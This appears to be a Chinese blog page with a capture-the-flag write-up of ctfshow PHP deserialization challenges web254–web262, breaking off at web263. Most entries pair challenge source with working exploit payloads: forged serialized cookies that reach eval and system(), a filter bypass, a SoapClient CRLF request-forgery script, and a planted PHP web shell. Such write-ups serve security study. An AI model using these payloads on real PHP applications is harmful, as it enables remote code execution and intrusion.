@@ -1,0 +1,1509 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web254-web278反序列化篇</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/09/17 17:29:18</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p>和反序列化没啥关系，可能只是来了解一下代码：</p>
+<pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+highlight_file(__FILE__);
+include(&#39;flag.php&#39;);
+
+class ctfShowUser&#123;
+  public $username&#x3D;&#39;xxxxxx&#39;;
+  public $password&#x3D;&#39;xxxxxx&#39;;
+  public $isVip&#x3D;false;
+
+  public function checkVip()&#123;
+    return $this-&gt;isVip;
+  &#125;
+  public function login($u,$p)&#123;
+    if($this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p)&#123;
+      $this-&gt;isVip&#x3D;true;
+    &#125;
+    return $this-&gt;isVip;
+  &#125;
+  public function vipOneKeyGetFlag()&#123;
+    if($this-&gt;isVip)&#123;
+      global $flag;
+      echo &quot;your flag is &quot;.$flag;
+    &#125;else&#123;
+      echo &quot;no vip, no flag&quot;;
+    &#125;
+  &#125;
+&#125;
+
+$username&#x3D;$_GET[&#39;username&#39;];
+$password&#x3D;$_GET[&#39;password&#39;];
+
+if(isset($username) &amp;&amp; isset($password))&#123;
+  $user &#x3D; new ctfShowUser();
+  if($user-&gt;login($username,$password))&#123;
+    if($user-&gt;checkVip())&#123;
+      $user-&gt;vipOneKeyGetFlag();
+    &#125;
+  &#125;else&#123;
+    echo &quot;no vip,no flag&quot;;
+  &#125;
+&#125;</code></pre>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</code></pre>
+<h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+highlight_file(__FILE__);
+include(&#39;flag.php&#39;);
+
+class ctfShowUser&#123;
+    public $username&#x3D;&#39;xxxxxx&#39;;
+    public $password&#x3D;&#39;xxxxxx&#39;;
+    public $isVip&#x3D;false;
+
+    public function checkVip()&#123;
+        return $this-&gt;isVip;
+    &#125;
+    public function login($u,$p)&#123;
+        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;
+    &#125;
+    public function vipOneKeyGetFlag()&#123;
+        if($this-&gt;isVip)&#123;
+            global $flag;
+            echo &quot;your flag is &quot;.$flag;
+        &#125;else&#123;
+            echo &quot;no vip, no flag&quot;;
+        &#125;
+    &#125;
+&#125;
+
+$username&#x3D;$_GET[&#39;username&#39;];
+$password&#x3D;$_GET[&#39;password&#39;];
+
+if(isset($username) &amp;&amp; isset($password))&#123;
+    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    
+    if($user-&gt;login($username,$password))&#123;
+        if($user-&gt;checkVip())&#123;
+            $user-&gt;vipOneKeyGetFlag();
+        &#125;
+    &#125;else&#123;
+        echo &quot;no vip,no flag&quot;;
+    &#125;
+&#125;</code></pre>
+<p>cookie传入反序列化参数，这里需要注意一个卡了我挺长时间的点就是分号作为cookie中分割符，反序列化中出现的分号要用url转义。</p>
+<pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;
+    public $username&#x3D;&#39;xxxxxx&#39;;
+    public $password&#x3D;&#39;xxxxxx&#39;;
+    public $isVip&#x3D;true;
+&#125;
+
+$a &#x3D; new ctfShowUser();
+echo str_replace(&#39;;&#39;, &#39;%3B&#39;, serialize($a));</code></pre>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">GET：
+?username&#x3D;xxxxxx
+&amp;password&#x3D;xxxxxx
+COOKIE：
+user&#x3D;O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;%3Bs:6:&quot;xxxxxx&quot;%3Bs:8:&quot;password&quot;%3Bs:6:&quot;xxxxxx&quot;%3Bs:5:&quot;isVip&quot;%3Bb:1%3B&#125;</code></pre>
+<h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+highlight_file(__FILE__);
+include(&#39;flag.php&#39;);
+
+class ctfShowUser&#123;
+    public $username&#x3D;&#39;xxxxxx&#39;;
+    public $password&#x3D;&#39;xxxxxx&#39;;
+    public $isVip&#x3D;false;
+
+    public function checkVip()&#123;
+        return $this-&gt;isVip;
+    &#125;
+    public function login($u,$p)&#123;
+        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;
+    &#125;
+    public function vipOneKeyGetFlag()&#123;
+        if($this-&gt;isVip)&#123;
+            global $flag;
+            if($this-&gt;username!&#x3D;&#x3D;$this-&gt;password)&#123;
+                    echo &quot;your flag is &quot;.$flag;
+              &#125;
+        &#125;else&#123;
+            echo &quot;no vip, no flag&quot;;
+        &#125;
+    &#125;
+&#125;
+
+$username&#x3D;$_GET[&#39;username&#39;];
+$password&#x3D;$_GET[&#39;password&#39;];
+
+if(isset($username) &amp;&amp; isset($password))&#123;
+    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    
+    if($user-&gt;login($username,$password))&#123;
+        if($user-&gt;checkVip())&#123;
+            $user-&gt;vipOneKeyGetFlag();
+        &#125;
+    &#125;else&#123;
+        echo &quot;no vip,no flag&quot;;
+    &#125;
+&#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;
+    public $username&#x3D;&#39;admin&#39;;
+    public $password&#x3D;&#39;xxxxxx&#39;;
+    public $isVip&#x3D;true;
+&#125;
+
+$a &#x3D; new ctfShowUser();
+echo urlencode(serialize($a));</code></pre>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;admin
+&amp;password&#x3D;xxxxxx
+COOKIE
+user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre>
+<h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;
+    private $username&#x3D;&#39;xxxxxx&#39;;
+    private $password&#x3D;&#39;xxxxxx&#39;;
+    private $isVip&#x3D;false;
+    private $class &#x3D; &#39;info&#39;;
+
+    public function __construct()&#123;
+        $this-&gt;class&#x3D;new info();
+    &#125;
+    public function login($u,$p)&#123;
+        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;
+    &#125;
+    public function __destruct()&#123;
+        $this-&gt;class-&gt;getInfo();
+    &#125;
+
+&#125;
+
+class info&#123;
+    private $user&#x3D;&#39;xxxxxx&#39;;
+    public function getInfo()&#123;
+        return $this-&gt;user;
+    &#125;
+&#125;
+
+class backDoor&#123;
+    private $code;
+    public function getInfo()&#123;
+        eval($this-&gt;code);
+    &#125;
+&#125;
+
+$username&#x3D;$_GET[&#39;username&#39;];
+$password&#x3D;$_GET[&#39;password&#39;];
+
+if(isset($username) &amp;&amp; isset($password))&#123;
+    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);
+    $user-&gt;login($username,$password);
+&#125;
+</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;
+    private $username&#x3D;&#39;xxxxxx&#39;;
+    private $password&#x3D;&#39;xxxxxx&#39;;
+    private $isVip&#x3D;false;
+    private $class &#x3D; &#39;info&#39;;
+
+    public function __construct()&#123;
+        $this-&gt;class&#x3D;new backDoor();
+    &#125;
+
+&#125;
+class backDoor&#123;
+    private $code &#x3D; &#39;system(&quot;tac f*&quot;);&#39;;
+&#125;
+
+$a &#x3D; new ctfShowUser();
+$b &#x3D; new backDoor();
+echo &quot;&lt;br&gt;&quot;.urlencode(serialize($a));</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">GET：
+?username&#x3D;admin&amp;password&#x3D;aaa
+COOKIE：
+user&#x3D;O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22tac+f%2A%22%29%3B%22%3B%7D%7D</code></pre>
+<h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser&#123;
+    public $username&#x3D;&#39;xxxxxx&#39;;
+    public $password&#x3D;&#39;xxxxxx&#39;;
+    public $isVip&#x3D;false;
+    public $class &#x3D; &#39;info&#39;;
+
+    public function __construct()&#123;
+        $this-&gt;class&#x3D;new info();
+    &#125;
+    public function login($u,$p)&#123;
+        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;
+    &#125;
+    public function __destruct()&#123;
+        $this-&gt;class-&gt;getInfo();
+    &#125;
+
+&#125;
+
+class info&#123;
+    public $user&#x3D;&#39;xxxxxx&#39;;
+    public function getInfo()&#123;
+        return $this-&gt;user;
+    &#125;
+&#125;
+
+class backDoor&#123;
+    public $code;
+    public function getInfo()&#123;
+        eval($this-&gt;code);
+    &#125;
+&#125;
+
+$username&#x3D;$_GET[&#39;username&#39;];
+$password&#x3D;$_GET[&#39;password&#39;];
+
+if(isset($username) &amp;&amp; isset($password))&#123;
+    if(!preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $_COOKIE[&#39;user&#39;]))&#123;
+        $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);
+    &#125;
+    $user-&gt;login($username,$password);
+&#125;</code></pre>
+<p>加了个过滤：<code>/[oc]:\d+:/i</code><br>过滤出：<code>o/c:数字</code><br>可以使用加号过滤：<code>o:+</code></p>
+<pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;
+    public $username&#x3D;&#39;xxxxxx&#39;;
+    public $password&#x3D;&#39;xxxxxx&#39;;
+    public $isVip&#x3D;false;
+    public $class &#x3D; &#39;info&#39;;
+
+    public function __construct()&#123;
+        $this-&gt;class&#x3D;new backDoor();
+    &#125;
+
+&#125;
+
+
+class backDoor&#123;
+    public $code &#x3D; &quot;system(&#39;tac f*&#39;);&quot;;
+    public function getInfo()&#123;
+        eval($this-&gt;code);
+    &#125;
+&#125;
+
+$a &#x3D; new ctfShowUser();
+$c &#x3D; str_replace(&quot;O:&quot;, &quot;O:+&quot;, serialize($a));
+echo &quot;&lt;br&gt;&quot;.$c;
+echo &quot;&lt;br&gt;user&#x3D;&quot;.urlencode($c);</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">user&#x3D;O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%27tac+f%2A%27%29%3B%22%3B%7D%7D</code></pre>
+<h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/studyskill/p/6972576.html">https://www.cnblogs.com/studyskill/p/6972576.html</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p>
+</blockquote>
+<h3 id="SoapCLient-CRLF"><a href="#SoapCLient-CRLF" class="headerlink" title="SoapCLient+CRLF"></a>SoapCLient+CRLF</h3><p>这怎么一下子升维了？</p>
+<pre class="language-php" data-language="php"><code class="language-php">$xff &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
+array_pop($xff);
+$ip &#x3D; array_pop($xff);
+
+
+if($ip!&#x3D;&#x3D;&#39;127.0.0.1&#39;)&#123;
+	die(&#39;error&#39;);
+&#125;else&#123;
+	$token &#x3D; $_POST[&#39;token&#39;];
+	if($token&#x3D;&#x3D;&#39;ctfshow&#39;)&#123;
+		file_put_contents(&#39;flag.txt&#39;,$flag);
+	&#125;
+&#125;</code></pre>
+<p>php中的连接web需要使用soapclient来连接。比较复杂，这里直接借用个脚本：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&#39;;
+$post_string &#x3D; &#39;token&#x3D;ctfshow&#39;;
+$headers &#x3D; array(
+    &#39;X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1&#39;,
+    &#39;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#39;
+);
+$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;yn8rt^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));
+
+$aaa &#x3D; serialize($b);
+$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);
+$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);
+echo urlencode($aaa);
+?&gt;
+    
+&#x2F;&#x2F;运行结果
+O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A235%3A%22yn8rt%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre>
+<p>传参之后访问flag.txt即可<br>没看懂的建议直接看：<br><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a></p>
+<h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><p>查询出题精神状态，怎么一下子又这么简单。</p>
+<pre class="language-php" data-language="php"><code class="language-php">if(preg_match(&#39;&#x2F;ctfshow_i_love_36D&#x2F;&#39;,serialize($_GET[&#39;ctfshow&#39;])))&#123;
+    echo $flag;
+&#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">class ctf &#123;
+    public $c &#x3D; &#39;ctfshow_i_love_36D&#39;;
+&#125;
+
+$a &#x3D; serialize(new ctf());
+echo urlencode($a);
+</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">?ctfshow&#x3D;O%3A3%3A%22ctf%22%3A1%3A%7Bs%3A1%3A%22c%22%3Bs%3A18%3A%22ctfshow_i_love_36D%22%3B%7D</code></pre>
+<h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><h3 id="unserialize-和wakeup"><a href="#unserialize-和wakeup" class="headerlink" title="__unserialize()和wakeup()"></a>__unserialize()和wakeup()</h3><pre class="language-php" data-language="php"><code class="language-php">
+highlight_file(__FILE__);
+
+class ctfshowvip&#123;
+    public $username;
+    public $password;
+    public $code;
+
+    public function __construct($u,$p)&#123;
+        $this-&gt;username&#x3D;$u;
+        $this-&gt;password&#x3D;$p;
+    &#125;
+    public function __wakeup()&#123;
+        if($this-&gt;username!&#x3D;&#39;&#39; || $this-&gt;password!&#x3D;&#39;&#39;)&#123;
+            die(&#39;error&#39;);
+        &#125;
+    &#125;
+    public function __invoke()&#123;
+        eval($this-&gt;code);
+    &#125;
+
+    public function __sleep()&#123;
+        $this-&gt;username&#x3D;&#39;&#39;;
+        $this-&gt;password&#x3D;&#39;&#39;;
+    &#125;
+  
+    public function __unserialize($data)&#123;
+        $this-&gt;username&#x3D;$data[&#39;username&#39;];
+        $this-&gt;password&#x3D;$data[&#39;password&#39;];
+        $this-&gt;code &#x3D; $this-&gt;username.$this-&gt;password;
+    &#125;
+  
+    public function __destruct()&#123;
+        if($this-&gt;code&#x3D;&#x3D;0x36d)&#123;
+            file_put_contents($this-&gt;username, $this-&gt;password);
+        &#125;
+    &#125;
+&#125;
+
+unserialize($_GET[&#39;vip&#39;]);</code></pre>
+<p><strong>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，</strong><br><strong>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</strong><br>其中注意一下几个：</p>
+<ul>
+<li><code>__wakeup()</code> 反序列化之后立刻调用</li>
+<li><code>__invoke()</code> 当作方法调用对象</li>
+<li><code>__sleep()</code> 反序列化之前运行</li>
+</ul>
+<p>invoke似乎进不去，这里利用弱比较拼接。0x36d对应的十进制是877.<br>由于弱比较的原因username传入877.php 再在password中加入shell即可。</p>
+<pre class="language-php" data-language="php"><code class="language-php">class ctfshowvip&#123;
+    public $username &#x3D; &quot;877.php&quot;;
+    public $password &#x3D; &#39;&lt;?php eval($_GET[1]);?&gt;&#39;;
+    public $code;
+
+&#125;
+echo &quot;\n&quot;.serialize(new ctfshowvip());</code></pre>
+<p>然后访问<code>877.php</code>然后传入shell：<br><code>/877.php?1=system(&#39;cat /flag_is_here&#39;);</code></p>
+<h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><h3 id="经典字符串逃逸-增长版"><a href="#经典字符串逃逸-增长版" class="headerlink" title="经典字符串逃逸-增长版"></a>经典字符串逃逸-增长版</h3><pre class="language-php" data-language="php"><code class="language-php">&#x2F;*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-03 02:37:19
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-03 16:05:38
+# @message.php
+# @email: h1xa@ctfer.com
+# @link: https:&#x2F;&#x2F;ctfer.com
+
+*&#x2F;
+error_reporting(0);
+class message&#123;
+    public $from;
+    public $msg;
+    public $to;
+    public $token&#x3D;&#39;user&#39;;
+    public function __construct($f,$m,$t)&#123;
+        $this-&gt;from &#x3D; $f;
+        $this-&gt;msg &#x3D; $m;
+        $this-&gt;to &#x3D; $t;
+    &#125;
+&#125;
+
+$f &#x3D; $_GET[&#39;f&#39;];
+$m &#x3D; $_GET[&#39;m&#39;];
+$t &#x3D; $_GET[&#39;t&#39;];
+
+if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;
+    $msg &#x3D; new message($f,$m,$t);
+    $umsg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
+    setcookie(&#39;msg&#39;,base64_encode($umsg));
+    echo &#39;Your message has been sent&#39;;
+&#125;
+
+highlight_file(__FILE__);</code></pre>
+<p>这里提示了还有一个message.php</p>
+<pre class="language-php" data-language="php"><code class="language-php">class message&#123;
+    public $from;
+    public $msg;
+    public $to;
+    public $token&#x3D;&#39;user&#39;;
+    public function __construct($f,$m,$t)&#123;
+        $this-&gt;from &#x3D; $f;
+        $this-&gt;msg &#x3D; $m;
+        $this-&gt;to &#x3D; $t;
+    &#125;
+&#125;
+
+if(isset($_COOKIE[&#39;msg&#39;]))&#123;
+    $msg &#x3D; unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));
+    if($msg-&gt;token&#x3D;&#x3D;&#39;admin&#39;)&#123;
+        echo $flag;
+    &#125;
+&#125;</code></pre>
+<p>那就是要将user转换为admin。那么先查看标准的结果：</p>
+<pre class="language-php" data-language="php"><code class="language-php">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;1&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre>
+<p>直接在t末尾修改：<br>将t修改为以下内容：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
+<p>一个转换就能多容纳一个位置，那么26个字符需要添加27个fuck。<br>然后就使用payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">?f&#x3D;1
+&amp;m&#x3D;1
+&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
+<p>然后访问message.php即可获取到flag</p>
+<h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><blockquote>
